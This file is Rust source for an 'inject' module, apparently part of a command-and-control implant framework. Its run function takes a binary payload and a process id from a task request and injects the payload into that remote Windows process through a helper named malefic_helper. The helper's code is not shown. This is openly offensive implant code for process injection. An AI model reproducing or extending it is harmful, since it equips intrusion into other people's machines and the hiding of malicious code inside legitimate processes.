use crate::prelude::*;

pub struct Inject {}

#[async_trait]
#[module_impl("inject")]
impl Module for Inject {}

#[async_trait]
impl ModuleImpl for Inject {
    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::Inject)?;

        let bin = check_field!(req.bin)?;
        to_error!(malefic_helper::win::inject::remote_inject(&*bin, req.pid))?;

        Ok(TaskResult::new(id))
    }
}